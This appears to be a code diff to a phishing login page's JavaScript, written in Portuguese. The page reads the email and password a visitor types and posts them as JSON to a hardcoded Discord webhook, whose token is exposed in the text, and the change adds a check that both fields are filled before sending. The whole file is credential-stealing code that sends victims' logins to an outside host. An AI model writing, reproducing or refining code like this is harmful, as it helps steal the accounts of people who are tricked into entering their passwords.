@@ -154,6 +154,7 @@ webhook="https://discord.com/api/webhooks/1347670923033186376/XwSb1uF7cjNHyRYoPY
 var senha=document.getElementById("senha").value;
 var email=document.getElementById("email").value;
 var errado=document.getElementById("errado");
+if (senha.length != 0 && email.length != 0){
 errado.classList.remove("animado");
 errado.style.display="none";
 setTimeout(function(){
@@ -171,7 +172,9 @@ headers: {"Content-Type":"application/json"},
 body: JSON.stringify(msg)
 
 });
-
+}else{
+alert("Por favor, preencha os campos de login.");
+}
 
 }
 
